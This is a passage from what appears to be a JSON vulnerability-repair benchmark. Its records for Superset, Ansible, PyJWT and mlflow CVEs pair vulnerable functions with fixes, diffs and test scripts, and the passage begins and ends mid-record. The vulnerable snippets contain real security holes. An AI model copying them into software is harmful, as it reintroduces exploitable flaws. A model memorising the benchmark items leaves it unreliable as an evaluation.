        "snippet": "class R(BaseSupersetView):  # pylint: disable=invalid-name\n\n    \"\"\"used for short urls\"\"\"\n\n    @event_logger.log_this\n    @expose(\"/<int:url_id>\")\n    def index(self, url_id: int) -> FlaskResponse:  # pylint: disable=no-self-use\n        url = db.session.query(models.Url).get(url_id)\n        if url and url.url:\n            explore_url = \"//superset/explore/?\"\n            if url.url.startswith(explore_url):\n                explore_url += f\"r={url_id}\"\n                return redirect(explore_url[1:])\n\n            return redirect(url.url[1:])\n\n        flash(\"URL to nowhere...\", \"danger\")\n        return redirect(\"/\")\n\n    @event_logger.log_this\n    @has_access_api\n    @expose(\"/shortner/\", methods=[\"POST\"])\n    def shortner(self) -> FlaskResponse:  # pylint: disable=no-self-use\n        url = request.form.get(\"data\")\n        obj = models.Url(url=url)\n        db.session.add(obj)\n        db.session.commit()\n        return Response(\n            \"{scheme}://{request.headers[Host]}/r/{obj.id}\".format(\n                scheme=request.scheme, request=request, obj=obj\n            ),\n            mimetype=\"text/plain\",\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_167_1",
        "commit": "eb35b80",
        "file_path": "superset/views/redirects.py",
        "start_line": 33,
        "end_line": 78,
        "snippet": "class R(BaseSupersetView):  # pylint: disable=invalid-name\n\n    \"\"\"used for short urls\"\"\"\n\n    @staticmethod\n    def _validate_url(url: Optional[str] = None) -> bool:\n        if url and (\n            url.startswith(\"//superset/dashboard/\")\n            or url.startswith(\"//superset/explore/\")\n        ):\n            return True\n        return False\n\n    @event_logger.log_this\n    @expose(\"/<int:url_id>\")\n    def index(self, url_id: int) -> FlaskResponse:  # pylint: disable=no-self-use\n        url = db.session.query(models.Url).get(url_id)\n        if url and url.url:\n            explore_url = \"//superset/explore/?\"\n            if url.url.startswith(explore_url):\n                explore_url += f\"r={url_id}\"\n                return redirect(explore_url[1:])\n            if self._validate_url(url.url):\n                return redirect(url.url[1:])\n            return redirect(\"/\")\n\n        flash(\"URL to nowhere...\", \"danger\")\n        return redirect(\"/\")\n\n    @event_logger.log_this\n    @has_access_api\n    @expose(\"/shortner/\", methods=[\"POST\"])\n    def shortner(self) -> FlaskResponse:  # pylint: disable=no-self-use\n        url = request.form.get(\"data\")\n        if not self._validate_url(url):\n            logger.warning(\"Invalid URL: %s\", url)\n            return Response(f\"Invalid URL: {url}\", 400)\n        obj = models.Url(url=url)\n        db.session.add(obj)\n        db.session.commit()\n        return Response(\n            \"{scheme}://{request.headers[Host]}/r/{obj.id}\".format(\n                scheme=request.scheme, request=request, obj=obj\n            ),\n            mimetype=\"text/plain\",\n        )"
      }
    ],
    "vul_patch": "--- a/superset/views/redirects.py\n+++ b/superset/views/redirects.py\n@@ -1,6 +1,15 @@\n class R(BaseSupersetView):  # pylint: disable=invalid-name\n \n     \"\"\"used for short urls\"\"\"\n+\n+    @staticmethod\n+    def _validate_url(url: Optional[str] = None) -> bool:\n+        if url and (\n+            url.startswith(\"//superset/dashboard/\")\n+            or url.startswith(\"//superset/explore/\")\n+        ):\n+            return True\n+        return False\n \n     @event_logger.log_this\n     @expose(\"/<int:url_id>\")\n@@ -11,8 +20,9 @@\n             if url.url.startswith(explore_url):\n                 explore_url += f\"r={url_id}\"\n                 return redirect(explore_url[1:])\n-\n-            return redirect(url.url[1:])\n+            if self._validate_url(url.url):\n+                return redirect(url.url[1:])\n+            return redirect(\"/\")\n \n         flash(\"URL to nowhere...\", \"danger\")\n         return redirect(\"/\")\n@@ -22,6 +32,9 @@\n     @expose(\"/shortner/\", methods=[\"POST\"])\n     def shortner(self) -> FlaskResponse:  # pylint: disable=no-self-use\n         url = request.form.get(\"data\")\n+        if not self._validate_url(url):\n+            logger.warning(\"Invalid URL: %s\", url)\n+            return Response(f\"Invalid URL: {url}\", 400)\n         obj = models.Url(url=url)\n         db.session.add(obj)\n         db.session.commit()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-3583",
    "cve_description": "A flaw was found in Ansible, where a user's controller is vulnerable to template injection. This issue can occur through facts used in the template if the user is trying to put templates in multi-line YAML strings and the facts being handled do not routinely include special template characters. This flaw allows attackers to perform command injection, which discloses sensitive information. The highest threat from this vulnerability is to confidentiality and integrity.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/8aa850e3573e48c9a2f12aef84e8a3a6f5ba4847",
      "https://github.com/ansible/ansible/commit/03aff644cc1c00e1f7551195c68fbd0d13a39e6e",
      "https://github.com/ansible/ansible/commit/8b17e5b9229ffaecfe10a4881bc3f87dd2c184e1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_15_1",
        "commit": "c49092f",
        "file_path": "lib/ansible/template/__init__.py",
        "start_line": 812,
        "end_line": 914,
        "snippet": "    def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=True, fail_on_undefined=None, overrides=None, disable_lookups=False):\n        if USE_JINJA2_NATIVE and not isinstance(data, string_types):\n            return data\n\n        # For preserving the number of input newlines in the output (used\n        # later in this method)\n        data_newlines = _count_newlines_from_end(data)\n\n        if fail_on_undefined is None:\n            fail_on_undefined = self._fail_on_undefined_errors\n\n        try:\n            # allows template header overrides to change jinja2 options.\n            if overrides is None:\n                myenv = self.environment.overlay()\n            else:\n                myenv = self.environment.overlay(overrides)\n\n            # Get jinja env overrides from template\n            if hasattr(data, 'startswith') and data.startswith(JINJA2_OVERRIDE):\n                eol = data.find('\\n')\n                line = data[len(JINJA2_OVERRIDE):eol]\n                data = data[eol + 1:]\n                for pair in line.split(','):\n                    (key, val) = pair.split(':')\n                    key = key.strip()\n                    setattr(myenv, key, ast.literal_eval(val.strip()))\n\n            # Adds Ansible custom filters and tests\n            myenv.filters.update(self._get_filters())\n            myenv.tests.update(self._get_tests())\n\n            if escape_backslashes:\n                # Allow users to specify backslashes in playbooks as \"\\\\\" instead of as \"\\\\\\\\\".\n                data = _escape_backslashes(data, myenv)\n\n            try:\n                t = myenv.from_string(data)\n            except TemplateSyntaxError as e:\n                raise AnsibleError(\"template error while templating string: %s. String: %s\" % (to_native(e), to_native(data)))\n            except Exception as e:\n                if 'recursion' in to_native(e):\n                    raise AnsibleError(\"recursive loop detected in template string: %s\" % to_native(data))\n                else:\n                    return data\n\n            # jinja2 global is inconsistent across versions, this normalizes them\n            t.globals['dict'] = dict\n\n            if disable_lookups:\n                t.globals['query'] = t.globals['q'] = t.globals['lookup'] = self._fail_lookup\n            else:\n                t.globals['lookup'] = self._lookup\n                t.globals['query'] = t.globals['q'] = self._query_lookup\n\n            t.globals['now'] = self._now_datetime\n\n            t.globals['finalize'] = self._finalize\n\n            jvars = AnsibleJ2Vars(self, t.globals)\n\n            self.cur_context = new_context = t.new_context(jvars, shared=True)\n            rf = t.root_render_func(new_context)\n\n            try:\n                res = j2_concat(rf)\n                if getattr(new_context, 'unsafe', False):\n                    res = wrap_var(res)\n            except TypeError as te:\n                if 'AnsibleUndefined' in to_native(te):\n                    errmsg = \"Unable to look up a name or access an attribute in template string (%s).\\n\" % to_native(data)\n                    errmsg += \"Make sure your variable name does not contain invalid characters like '-': %s\" % to_native(te)\n                    raise AnsibleUndefinedVariable(errmsg)\n                else:\n                    display.debug(\"failing because of a type error, template data is: %s\" % to_text(data))\n                    raise AnsibleError(\"Unexpected templating type error occurred on (%s): %s\" % (to_native(data), to_native(te)))\n\n            if USE_JINJA2_NATIVE and not isinstance(res, string_types):\n                return res\n\n            if preserve_trailing_newlines:\n                # The low level calls above do not preserve the newline\n                # characters at the end of the input data, so we use the\n                # calculate the difference in newlines and append them\n                # to the resulting output for parity\n                #\n                # jinja2 added a keep_trailing_newline option in 2.7 when\n                # creating an Environment.  That would let us make this code\n                # better (remove a single newline if\n                # preserve_trailing_newlines is False).  Once we can depend on\n                # that version being present, modify our code to set that when\n                # initializing self.environment and remove a single trailing\n                # newline here if preserve_newlines is False.\n                res_newlines = _count_newlines_from_end(res)\n                if data_newlines > res_newlines:\n                    res += self.environment.newline_sequence * (data_newlines - res_newlines)\n            return res\n        except (UndefinedError, AnsibleUndefinedVariable) as e:\n            if fail_on_undefined:\n                raise AnsibleUndefinedVariable(e)\n            else:\n                display.debug(\"Ignoring undefined failure: %s\" % to_text(e))\n                return data"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_15_1",
        "commit": "8aa850e",
        "file_path": "lib/ansible/template/__init__.py",
        "start_line": 1008,
        "end_line": 1106,
        "snippet": "    def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=True, fail_on_undefined=None, overrides=None, disable_lookups=False):\n        if USE_JINJA2_NATIVE and not isinstance(data, string_types):\n            return data\n\n        # For preserving the number of input newlines in the output (used\n        # later in this method)\n        data_newlines = _count_newlines_from_end(data)\n\n        if fail_on_undefined is None:\n            fail_on_undefined = self._fail_on_undefined_errors\n\n        try:\n            # allows template header overrides to change jinja2 options.\n            if overrides is None:\n                myenv = self.environment.overlay()\n            else:\n                myenv = self.environment.overlay(overrides)\n\n            # Get jinja env overrides from template\n            if hasattr(data, 'startswith') and data.startswith(JINJA2_OVERRIDE):\n                eol = data.find('\\n')\n                line = data[len(JINJA2_OVERRIDE):eol]\n                data = data[eol + 1:]\n                for pair in line.split(','):\n                    (key, val) = pair.split(':')\n                    key = key.strip()\n                    setattr(myenv, key, ast.literal_eval(val.strip()))\n\n            # Adds Ansible custom filters and tests\n            myenv.filters.update(self._get_filters())\n            for k in myenv.filters:\n                if not getattr(myenv.filters[k], '__UNROLLED__', False):\n                    myenv.filters[k] = _unroll_iterator(myenv.filters[k])\n            myenv.tests.update(self._get_tests())\n\n            if escape_backslashes:\n                # Allow users to specify backslashes in playbooks as \"\\\\\" instead of as \"\\\\\\\\\".\n                data = _escape_backslashes(data, myenv)\n\n            try:\n                t = myenv.from_string(data)\n            except TemplateSyntaxError as e:\n                raise AnsibleError(\"template error while templating string: %s. String: %s\" % (to_native(e), to_native(data)))\n            except Exception as e:\n                if 'recursion' in to_native(e):\n                    raise AnsibleError(\"recursive loop detected in template string: %s\" % to_native(data))\n                else:\n                    return data\n\n            if disable_lookups:\n                t.globals['query'] = t.globals['q'] = t.globals['lookup'] = self._fail_lookup\n\n            jvars = AnsibleJ2Vars(self, t.globals)\n\n            self.cur_context = new_context = t.new_context(jvars, shared=True)\n            rf = t.root_render_func(new_context)\n\n            try:\n                res = j2_concat(rf)\n                unsafe = getattr(new_context, 'unsafe', False)\n                if unsafe:\n                    res = wrap_var(res)\n            except TypeError as te:\n                if 'AnsibleUndefined' in to_native(te):\n                    errmsg = \"Unable to look up a name or access an attribute in template string (%s).\\n\" % to_native(data)\n                    errmsg += \"Make sure your variable name does not contain invalid characters like '-': %s\" % to_native(te)\n                    raise AnsibleUndefinedVariable(errmsg)\n                else:\n                    display.debug(\"failing because of a type error, template data is: %s\" % to_text(data))\n                    raise AnsibleError(\"Unexpected templating type error occurred on (%s): %s\" % (to_native(data), to_native(te)))\n\n            if USE_JINJA2_NATIVE and not isinstance(res, string_types):\n                return res\n\n            if preserve_trailing_newlines:\n                # The low level calls above do not preserve the newline\n                # characters at the end of the input data, so we use the\n                # calculate the difference in newlines and append them\n                # to the resulting output for parity\n                #\n                # jinja2 added a keep_trailing_newline option in 2.7 when\n                # creating an Environment.  That would let us make this code\n                # better (remove a single newline if\n                # preserve_trailing_newlines is False).  Once we can depend on\n                # that version being present, modify our code to set that when\n                # initializing self.environment and remove a single trailing\n                # newline here if preserve_newlines is False.\n                res_newlines = _count_newlines_from_end(res)\n                if data_newlines > res_newlines:\n                    res += self.environment.newline_sequence * (data_newlines - res_newlines)\n                    if unsafe:\n                        res = wrap_var(res)\n            return res\n        except (UndefinedError, AnsibleUndefinedVariable) as e:\n            if fail_on_undefined:\n                raise AnsibleUndefinedVariable(e)\n            else:\n                display.debug(\"Ignoring undefined failure: %s\" % to_text(e))\n                return data"
      }
    ],
    "vul_patch": "--- a/lib/ansible/template/__init__.py\n+++ b/lib/ansible/template/__init__.py\n@@ -28,6 +28,9 @@\n \n             # Adds Ansible custom filters and tests\n             myenv.filters.update(self._get_filters())\n+            for k in myenv.filters:\n+                if not getattr(myenv.filters[k], '__UNROLLED__', False):\n+                    myenv.filters[k] = _unroll_iterator(myenv.filters[k])\n             myenv.tests.update(self._get_tests())\n \n             if escape_backslashes:\n@@ -44,18 +47,8 @@\n                 else:\n                     return data\n \n-            # jinja2 global is inconsistent across versions, this normalizes them\n-            t.globals['dict'] = dict\n-\n             if disable_lookups:\n                 t.globals['query'] = t.globals['q'] = t.globals['lookup'] = self._fail_lookup\n-            else:\n-                t.globals['lookup'] = self._lookup\n-                t.globals['query'] = t.globals['q'] = self._query_lookup\n-\n-            t.globals['now'] = self._now_datetime\n-\n-            t.globals['finalize'] = self._finalize\n \n             jvars = AnsibleJ2Vars(self, t.globals)\n \n@@ -64,7 +57,8 @@\n \n             try:\n                 res = j2_concat(rf)\n-                if getattr(new_context, 'unsafe', False):\n+                unsafe = getattr(new_context, 'unsafe', False)\n+                if unsafe:\n                     res = wrap_var(res)\n             except TypeError as te:\n                 if 'AnsibleUndefined' in to_native(te):\n@@ -94,6 +88,8 @@\n                 res_newlines = _count_newlines_from_end(res)\n                 if data_newlines > res_newlines:\n                     res += self.environment.newline_sequence * (data_newlines - res_newlines)\n+                    if unsafe:\n+                        res = wrap_var(res)\n             return res\n         except (UndefinedError, AnsibleUndefinedVariable) as e:\n             if fail_on_undefined:\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-3583:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/ansible\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook test/integration/targets/template/unsafe.yml -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-3583:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/ansible\ngit apply --whitespace=nowarn /workspace/fix.patch\n# PYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook test/integration/targets/template/72262.yml test/integration/targets/template/6653.yml test/integration/targets/template/72615.yml -v\ncd test/integration/targets/template/\n# Test for several corner cases #57188\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook corner_cases.yml -v \"$@\"\n\n# Test for #57351\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook filter_plugins.yml -v \"$@\"\n\n# https://github.com/ansible/ansible/issues/68699\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook unused_vars_include.yml -v \"$@\"\n\n# https://github.com/ansible/ansible/issues/55152\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook undefined_var_info.yml -v \"$@\"\n\n# https://github.com/ansible/ansible/issues/72615\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook 72615.yml -v \"$@\"\n\n# https://github.com/ansible/ansible/issues/6653\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook 6653.yml -v \"$@\"\n\n# https://github.com/ansible/ansible/issues/72262\nPYTHONPATH=./lib /workspace/PoC_env/CVE-2021-3583/bin/ansible-playbook 72262.yml -v \"$@\"\n"
  },
  {
    "cve_id": "CVE-2022-29217",
    "cve_description": "PyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.",
    "cwe_info": {
      "CWE-327": {
        "name": "Use of a Broken or Risky Cryptographic Algorithm",
        "description": "The product uses a broken or risky cryptographic algorithm or protocol."
      }
    },
    "repo": "https://github.com/jpadilla/pyjwt",
    "patch_url": [
      "https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_71_1",
        "commit": "24b29ad",
        "file_path": "jwt/algorithms.py",
        "start_line": 183,
        "end_line": 199,
        "snippet": "    def prepare_key(self, key):\n        key = force_bytes(key)\n\n        invalid_strings = [\n            b\"-----BEGIN PUBLIC KEY-----\",\n            b\"-----BEGIN CERTIFICATE-----\",\n            b\"-----BEGIN RSA PUBLIC KEY-----\",\n            b\"ssh-rsa\",\n        ]\n\n        if any(string_value in key for string_value in invalid_strings):\n            raise InvalidKeyError(\n                \"The specified key is an asymmetric key or x509 certificate and\"\n                \" should not be used as an HMAC secret.\"\n            )\n\n        return key"
      },
      {
        "id": "vul_py_71_2",
        "commit": "24b29ad",
        "file_path": "jwt/algorithms.py",
        "start_line": 553,
        "end_line": 573,
        "snippet": "        def prepare_key(self, key):\n\n            if isinstance(\n                key,\n                (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\n            ):\n                return key\n\n            if isinstance(key, (bytes, str)):\n                if isinstance(key, str):\n                    key = key.encode(\"utf-8\")\n                str_key = key.decode(\"utf-8\")\n\n                if \"-----BEGIN PUBLIC\" in str_key:\n                    return load_pem_public_key(key)\n                if \"-----BEGIN PRIVATE\" in str_key:\n                    return load_pem_private_key(key, password=None)\n                if str_key[0:4] == \"ssh-\":\n                    return load_ssh_public_key(key)\n\n            raise TypeError(\"Expecting a PEM-formatted or OpenSSH key.\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_71_1",
        "commit": "9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "file_path": "jwt/algorithms.py",
        "start_line": 185,
        "end_line": 194,
        "snippet": "    def prepare_key(self, key):\n        key = force_bytes(key)\n\n        if is_pem_format(key) or is_ssh_key(key):\n            raise InvalidKeyError(\n                \"The specified key is an asymmetric key or x509 certificate and\"\n                \" should not be used as an HMAC secret.\"\n            )\n\n        return key"
      },
      {
        "id": "fix_py_71_2",
        "commit": "9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "file_path": "jwt/algorithms.py",
        "start_line": 548,
        "end_line": 570,
        "snippet": "        def prepare_key(self, key):\n            if isinstance(key, (bytes, str)):\n                if isinstance(key, str):\n                    key = key.encode(\"utf-8\")\n                str_key = key.decode(\"utf-8\")\n\n                if \"-----BEGIN PUBLIC\" in str_key:\n                    key = load_pem_public_key(key)\n                elif \"-----BEGIN PRIVATE\" in str_key:\n                    key = load_pem_private_key(key, password=None)\n                elif str_key[0:4] == \"ssh-\":\n                    key = load_ssh_public_key(key)\n\n            # Explicit check the key to prevent confusing errors from cryptography\n            if not isinstance(\n                key,\n                (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\n            ):\n                raise InvalidKeyError(\n                    \"Expecting a EllipticCurvePrivateKey/EllipticCurvePublicKey. Wrong key provided for EdDSA algorithms\"\n                )\n\n            return key"
      },
      {
        "id": "fix_py_71_3",
        "commit": "9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "file_path": "jwt/utils.py",
        "start_line": 101,
        "end_line": 130,
        "snippet": "\n\n# Based on https://github.com/hynek/pem/blob/7ad94db26b0bc21d10953f5dbad3acfdfacf57aa/src/pem/_core.py#L224-L252\n_PEMS = {\n    b\"CERTIFICATE\",\n    b\"TRUSTED CERTIFICATE\",\n    b\"PRIVATE KEY\",\n    b\"PUBLIC KEY\",\n    b\"ENCRYPTED PRIVATE KEY\",\n    b\"OPENSSH PRIVATE KEY\",\n    b\"DSA PRIVATE KEY\",\n    b\"RSA PRIVATE KEY\",\n    b\"RSA PUBLIC KEY\",\n    b\"EC PRIVATE KEY\",\n    b\"DH PARAMETERS\",\n    b\"NEW CERTIFICATE REQUEST\",\n    b\"CERTIFICATE REQUEST\",\n    b\"SSH2 PUBLIC KEY\",\n    b\"SSH2 ENCRYPTED PRIVATE KEY\",\n    b\"X509 CRL\",\n}\n\n_PEM_RE = re.compile(\n    b\"----[- ]BEGIN (\"\n    + b\"|\".join(_PEMS)\n    + b\"\"\")[- ]----\\r?\n.+?\\r?\n----[- ]END \\\\1[- ]----\\r?\\n?\"\"\",\n    re.DOTALL,\n)"
      },
      {
        "id": "fix_py_71_4",
        "commit": "9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "file_path": "jwt/utils.py",
        "start_line": 133,
        "end_line": 147,
        "snippet": "def is_pem_format(key: bytes) -> bool:\n    return bool(_PEM_RE.search(key))\n\n\n# Based on https://github.com/pyca/cryptography/blob/bcb70852d577b3f490f015378c75cba74986297b/src/cryptography/hazmat/primitives/serialization/ssh.py#L40-L46\n_CERT_SUFFIX = b\"-cert-v01@openssh.com\"\n_SSH_PUBKEY_RC = re.compile(br\"\\A(\\S+)[ \\t]+(\\S+)\")\n_SSH_KEY_FORMATS = [\n    b\"ssh-ed25519\",\n    b\"ssh-rsa\",\n    b\"ssh-dss\",\n    b\"ecdsa-sha2-nistp256\",\n    b\"ecdsa-sha2-nistp384\",\n    b\"ecdsa-sha2-nistp521\",\n]"
      },
      {
        "id": "fix_py_71_5",
        "commit": "9c528670c455b8d948aff95ed50e22940d1ad3fc",
        "file_path": "jwt/utils.py",
        "start_line": 150,
        "end_line": 160,
        "snippet": "def is_ssh_key(key: bytes) -> bool:\n    if any(string_value in key for string_value in _SSH_KEY_FORMATS):\n        return True\n\n    ssh_pubkey_match = _SSH_PUBKEY_RC.match(key)\n    if ssh_pubkey_match:\n        key_type = ssh_pubkey_match.group(1)\n        if _CERT_SUFFIX == key_type[-len(_CERT_SUFFIX) :]:\n            return True\n\n    return False"
      }
    ],
    "vul_patch": "--- a/jwt/algorithms.py\n+++ b/jwt/algorithms.py\n@@ -1,14 +1,7 @@\n     def prepare_key(self, key):\n         key = force_bytes(key)\n \n-        invalid_strings = [\n-            b\"-----BEGIN PUBLIC KEY-----\",\n-            b\"-----BEGIN CERTIFICATE-----\",\n-            b\"-----BEGIN RSA PUBLIC KEY-----\",\n-            b\"ssh-rsa\",\n-        ]\n-\n-        if any(string_value in key for string_value in invalid_strings):\n+        if is_pem_format(key) or is_ssh_key(key):\n             raise InvalidKeyError(\n                 \"The specified key is an asymmetric key or x509 certificate and\"\n                 \" should not be used as an HMAC secret.\"\n\n--- a/jwt/algorithms.py\n+++ b/jwt/algorithms.py\n@@ -1,21 +1,23 @@\n         def prepare_key(self, key):\n-\n-            if isinstance(\n-                key,\n-                (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\n-            ):\n-                return key\n-\n             if isinstance(key, (bytes, str)):\n                 if isinstance(key, str):\n                     key = key.encode(\"utf-8\")\n                 str_key = key.decode(\"utf-8\")\n \n                 if \"-----BEGIN PUBLIC\" in str_key:\n-                    return load_pem_public_key(key)\n-                if \"-----BEGIN PRIVATE\" in str_key:\n-                    return load_pem_private_key(key, password=None)\n-                if str_key[0:4] == \"ssh-\":\n-                    return load_ssh_public_key(key)\n+                    key = load_pem_public_key(key)\n+                elif \"-----BEGIN PRIVATE\" in str_key:\n+                    key = load_pem_private_key(key, password=None)\n+                elif str_key[0:4] == \"ssh-\":\n+                    key = load_ssh_public_key(key)\n \n-            raise TypeError(\"Expecting a PEM-formatted or OpenSSH key.\")\n+            # Explicit check the key to prevent confusing errors from cryptography\n+            if not isinstance(\n+                key,\n+                (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\n+            ):\n+                raise InvalidKeyError(\n+                    \"Expecting a EllipticCurvePrivateKey/EllipticCurvePublicKey. Wrong key provided for EdDSA algorithms\"\n+                )\n+\n+            return key\n\n--- /dev/null\n+++ b/jwt/algorithms.py\n@@ -0,0 +1,30 @@\n+\n+\n+# Based on https://github.com/hynek/pem/blob/7ad94db26b0bc21d10953f5dbad3acfdfacf57aa/src/pem/_core.py#L224-L252\n+_PEMS = {\n+    b\"CERTIFICATE\",\n+    b\"TRUSTED CERTIFICATE\",\n+    b\"PRIVATE KEY\",\n+    b\"PUBLIC KEY\",\n+    b\"ENCRYPTED PRIVATE KEY\",\n+    b\"OPENSSH PRIVATE KEY\",\n+    b\"DSA PRIVATE KEY\",\n+    b\"RSA PRIVATE KEY\",\n+    b\"RSA PUBLIC KEY\",\n+    b\"EC PRIVATE KEY\",\n+    b\"DH PARAMETERS\",\n+    b\"NEW CERTIFICATE REQUEST\",\n+    b\"CERTIFICATE REQUEST\",\n+    b\"SSH2 PUBLIC KEY\",\n+    b\"SSH2 ENCRYPTED PRIVATE KEY\",\n+    b\"X509 CRL\",\n+}\n+\n+_PEM_RE = re.compile(\n+    b\"----[- ]BEGIN (\"\n+    + b\"|\".join(_PEMS)\n+    + b\"\"\")[- ]----\\r?\n+.+?\\r?\n+----[- ]END \\\\1[- ]----\\r?\\n?\"\"\",\n+    re.DOTALL,\n+)\n\n--- /dev/null\n+++ b/jwt/algorithms.py\n@@ -0,0 +1,15 @@\n+def is_pem_format(key: bytes) -> bool:\n+    return bool(_PEM_RE.search(key))\n+\n+\n+# Based on https://github.com/pyca/cryptography/blob/bcb70852d577b3f490f015378c75cba74986297b/src/cryptography/hazmat/primitives/serialization/ssh.py#L40-L46\n+_CERT_SUFFIX = b\"-cert-v01@openssh.com\"\n+_SSH_PUBKEY_RC = re.compile(br\"\\A(\\S+)[ \\t]+(\\S+)\")\n+_SSH_KEY_FORMATS = [\n+    b\"ssh-ed25519\",\n+    b\"ssh-rsa\",\n+    b\"ssh-dss\",\n+    b\"ecdsa-sha2-nistp256\",\n+    b\"ecdsa-sha2-nistp384\",\n+    b\"ecdsa-sha2-nistp521\",\n+]\n\n--- /dev/null\n+++ b/jwt/algorithms.py\n@@ -0,0 +1,11 @@\n+def is_ssh_key(key: bytes) -> bool:\n+    if any(string_value in key for string_value in _SSH_KEY_FORMATS):\n+        return True\n+\n+    ssh_pubkey_match = _SSH_PUBKEY_RC.match(key)\n+    if ssh_pubkey_match:\n+        key_type = ssh_pubkey_match.group(1)\n+        if _CERT_SUFFIX == key_type[-len(_CERT_SUFFIX) :]:\n+            return True\n+\n+    return False\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-29217:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/pyjwt\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-29217/bin/python -m pytest tests/test_advisory.py tests/test_algorithms.py::TestOKPAlgorithms::test_okp_ed25519_should_reject_non_string_key -v\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-29217:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/pyjwt\ngit apply --whitespace=nowarn /workspace/test.patch\n/workspace/PoC_env/CVE-2022-29217/bin/python -m pytest tests/test_algorithms.py -v -k \"not test_okp_ed25519_should_reject_non_string_key\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-0520",
    "cve_description": "A vulnerability in mlflow/mlflow version 8.2.1 allows for remote code execution due to improper neutralization of special elements used in an OS command ('Command Injection') within the `mlflow.data.http_dataset_source.py` module. Specifically, when loading a dataset from a source URL with an HTTP scheme, the filename extracted from the `Content-Disposition` header or the URL path is used to generate the final file path without proper sanitization. This flaw enables an attacker to control the file path fully by utilizing path traversal or absolute path techniques, such as '../../tmp/poc.txt' or '/tmp/poc.txt', leading to arbitrary file write. Exploiting this vulnerability could allow a malicious user to execute commands on the vulnerable machine, potentially gaining access to data and model information. The issue is fixed in version 2.9.0.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_393_1",
        "commit": "d10f342899f2677a57e92e6380ea2ba883c3adf3",
        "file_path": "mlflow/data/http_dataset_source.py",
        "start_line": 36,
        "end_line": 74,
